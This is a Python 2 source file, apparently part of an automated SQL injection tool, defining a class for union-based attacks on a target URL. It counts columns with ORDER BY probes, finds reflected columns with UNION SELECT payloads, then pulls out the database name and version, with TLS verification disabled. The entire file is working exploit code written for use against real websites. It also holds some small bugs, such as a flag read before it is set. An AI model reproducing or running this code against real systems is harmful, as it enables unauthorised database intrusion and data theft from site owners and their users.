# -*- coding: utf-8 -*-
"""
    This file contain union exploit class
"""
try:
    from src.Colors import TextColor
    from injection_defines import *
    import requests as reqs
    import sys
    import string as string
    import re
    from time import sleep
    from Config.WebConfig import (define_headerdata)

    reload(sys)
    sys.setdefaultencoding('utf-8')

except Exception as err:
    raise SystemExit, TextColor.RED + str("something is wrong " + err) + \
                      TextColor.WHITE


class UnionBaseAttack(object):

    def __init__(self, url, injectedChar, firstResponse):
        self.url = url
        self.injectedChar = injectedChar
        self.firstResponse = firstResponse

        self.__start_attack__()

    def __start_attack__(self):
        # First we extract how many columns is exists
        columns = self.__order_by_cmd__()
        # second we test union base attack
        self.__union_base__(columns)

    def __union_base__(self, columns):

        def list_injection_number(columns):
            list_injection_numbers = list()
            for number in xrange(1, columns + 1):
                list_injection_numbers.append(str(number) * 10)
            return list_injection_numbers

        def create_url(columns):
            list_injection_numbers = list_injection_number(columns)

            injection_string = ""

            for counter in list_injection_numbers:
                injection_string = injection_string + str(counter) + ","
            injection_string = injection_string[0: len(injection_string) - 1]

            id_number = re.findall('\d', self.url)
            new_url = str(string.replace(self.url, id_number[0], '-' + id_number[0]))
            return (new_url, injection_string)

        def extract_number_of_vulnarable_columns(injection_tuple,columns):
            vuln_columns = list()
            raw_vuln_columns = list()
            list_injection_numbers = list_injection_number(columns)
            for item in define_union_select_query_php:
                response = reqs.get(url=injection_tuple[0] + str(item + injection_tuple[1]),
                                    headers=define_headerdata, verify=False)
                for numbers in list_injection_numbers:
                    if response.content.find(numbers) is not -1:
                        vuln_columns.append(numbers[0:1])
                        raw_vuln_columns.append(numbers)
                        done_searching_columns = True
                sleep(0.5)
                if done_searching_columns == True:
                    success_InjectedString = injection_tuple[0] + str(item + injection_tuple[1])
                    break

            str_vulns_columns = ""
            for item in vuln_columns:
                str_vulns_columns = str_vulns_columns + item + " "
            str_vulns_columns = str_vulns_columns[0:len(str_vulns_columns) - 1]

            print TextColor.CYELLOWBG + "[+] Found Vulnarable columns number " + TextColor.WHITE
            sys.stdout.write("Vulnarable Columns =>\n\t\t" + ("-" * (len(str_vulns_columns) + 2)) + "\n\t\t|" + str_vulns_columns)
            sys.stdout.write("|\n\t\t" + ("-" * (len(str_vulns_columns) + 2)) + "\n")

            return (raw_vuln_columns, success_InjectedString)


        def extract_database_name(tuple_var):
            for item in define_database_detection_query_php:
                response = reqs.get(str(string.replace(tuple_var[1], tuple_var[0][0], item)),
                                            headers=define_headerdata, verify=False)
                if response.content.find("'2134115356'") is not -1:
                    end = re.search("'2134115356'", response.content).end()
                    starts = re.search("'62134115356'", response.content).start()
                    print TextColor.CBEIGE2 + str("[+]Database is => ") + response.content[end:starts] + TextColor.WHITE
                sleep(.5)
            sleep(.5)

        def extract_version(tuple_var):
            for item in define_version_detection_query_php:
                response = reqs.get(str(string.replace(tuple_var[1], tuple_var[0][0], item)),
                                            headers=define_headerdata, verify=False)
                if response.content.find("'2134115356'") is not -1:
                    end = re.search("'2134115356'", response.content).end()
                    starts = re.search("'62134115356'", response.content).start()
                    print TextColor.CBEIGE2 + str("[+]Version of database is => ") + response.content[end:starts] + TextColor.WHITE
                sleep(.5)
            sleep(.5)


        #start from here
        injection_string_tuple = create_url(columns)
        tuple_of_injectionString_and_vulnColumns = extract_number_of_vulnarable_columns(injection_string_tuple, columns)
        extract_database_name(tuple_of_injectionString_and_vulnColumns)
        extract_version(tuple_of_injectionString_and_vulnColumns)


    def __order_by_cmd__(self):
        injected_method = ""
        end_sharp = ""

        def item_error_checker(response):
            return_r = False
            for item in define_error_order_by_php:
                if response.find(item) is not -1 or \
                        response != self.firstResponse.content:
                    return_r = True
            return return_r

        def get_columns_number(method, end_sharp):
            for counter in xrange(1, 1000):
                sleep(1)
                if end_sharp != "":
                    secondResponse = reqs.get(self.url + method + str(counter),
                                              headers=define_headerdata, verify=False)
                else:
                    secondResponse = reqs.get(self.url + method + str(counter) + " %23",
                                              headers=define_headerdata, verify=False)

                if secondResponse.content != self.firstResponse.content:
                    return counter - 1

        for item in define_order_by_command_php:
            sleep(.5)
            secondResponse = reqs.get(url=self.url + str(item), headers=define_headerdata, verify=False)
            if item_error_checker(secondResponse.content):
                '''now we can find which command is used for injection'''
                injected_method = item[0: 10]  # it can be ['order by', 'group by']
                if item[-1] == "3":
                    end_sharp = "%23"
                break

        print TextColor.CVIOLET + str(
            "\nWorking on count of columns ... please wait untill I found them") + TextColor.WHITE

        print
        columns = get_columns_number(injected_method, end_sharp)
        order_by_string = self.url + injected_method + str(columns)
        print TextColor.CBEIGE + str("[+] Found => %d columns {%s}"%(columns, order_by_string)) + TextColor.WHITE
        print TextColor.CVIOLET + str("\nNow I testing the union select query ...") + TextColor.WHITE

        return columns